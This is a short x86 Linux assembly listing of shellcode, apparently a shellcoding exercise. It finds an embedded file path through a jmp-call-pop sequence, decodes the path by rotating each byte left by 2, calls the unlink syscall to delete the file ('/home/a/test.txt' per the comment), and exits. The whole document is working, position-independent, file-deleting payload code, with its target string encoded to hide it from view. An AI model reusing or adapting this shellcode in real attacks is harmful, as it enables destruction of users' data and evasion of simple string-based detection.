global _start
_start:
                 	jmp     short  call_shellcode

			shellcode:
                 	pop    ebx
                	xor    eax,eax
                	mov    ecx,ebx

			restore_rol:
                	cmp    BYTE  [ecx],al
                	je     end_of_string
                   	rol byte [ecx],2
                   	inc    ecx
                	jmp    restore_rol

			end_of_string:
                	mov    al,0x5
                	add    al,0x5
                	int    0x80
                	mov    al,0x1
               	int    0x80

call_shellcode:
        	call   shellcode
		filepath db 0xcb, 0x1a, 0xdb, 0x5b, 0x59,0xcb,0x58, 0xcb, 0x1d,0x59, 0xdc,0x1d,0x8b,0x1d,0x1e,0x1d,0x00
		;filepath is encoded version von "/home/a/test.txt". Every byte is rotated to the right by 2.

